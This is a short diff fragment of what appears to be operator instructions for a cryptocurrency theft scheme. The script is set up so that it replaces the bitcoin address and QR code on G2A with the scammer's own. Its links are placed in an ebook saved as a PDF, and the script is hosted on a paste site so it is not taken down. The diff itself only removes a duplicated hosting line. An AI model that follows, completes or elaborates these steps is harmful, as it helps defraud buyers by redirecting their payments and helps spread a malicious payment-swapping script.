@@ -14,8 +14,6 @@ Replace all 4 results with your bech32 bitcoin address (the one that starts with
 
 Remember to check on g2a if the script is working and changing btc address to your own + qr code to your own (if it's not, then you did something wrong)
 
-Use https://pst.klgrth.io/ to host your script (so it doesn't get removed)
-
 In the ebook replace links to the script and save as pdf
 
 Use https://pst.klgrth.io/ to host your script, so it never gets removed
